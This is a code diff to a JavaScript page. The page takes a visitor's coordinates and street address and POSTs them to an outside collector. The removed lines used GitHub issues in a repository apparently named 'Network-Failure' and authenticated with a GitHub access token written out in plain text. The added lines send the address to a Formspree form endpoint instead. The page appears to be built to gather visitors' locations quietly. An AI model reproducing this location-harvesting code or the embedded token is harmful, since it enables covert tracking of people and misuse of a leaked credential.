@@ -38,18 +38,13 @@
                   if (data && data.address) {
                     const address = data.address;
                    const formattedAddress = `${address.road}, ${address.city}, ${address.state}, ${address.country}`;
-                    // Send this geolocation data to GitHub using GitHub API
-              fetch("https://api.github.com/repos/bhanubediya/Network-Failure/issues", {
+                    const formspreeUrl = "https://formspree.io/f/xgvavavw"; 
+
+              // Send geolocation data to Formspree via POST request
+              fetch(formspreeUrl, {
                 method: "POST",
-                headers: {
-                  Authorization: `token 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`,
-                  "Content-Type": "application/json",
-                },
                 body: JSON.stringify({
-                  title: `Geolocation: ${latitude}, ${longitude}`,
-                  body: `Latitude: ${latitude}, Longitude: ${longitude}`,
-                  labels: ["Geolocation"],
-                  Address: formattedAddress,
+                  body: formattedAddress
                 }),
               })
                 .then((response) => response.json())
